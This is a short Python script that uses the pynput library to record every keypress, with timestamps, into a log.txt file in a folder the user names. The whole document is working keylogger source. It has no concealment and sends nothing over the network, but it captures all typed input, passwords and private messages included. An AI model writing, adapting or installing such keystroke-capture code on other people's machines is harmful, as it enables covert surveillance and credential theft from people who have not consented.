import logging
from pynput.keyboard import Listener


def config_path():
    path = input("Specify the folder to save the log file:")
    logging.basicConfig(filename=f'{path}/log.txt', format='%(asctime)s: %(message)s',level=logging.DEBUG)


def key_recorder(key):
    logging.info(key)


if __name__ == '__main__':
    config_path()
    with Listener(on_press=key_recorder) as listener:
        listener.join()

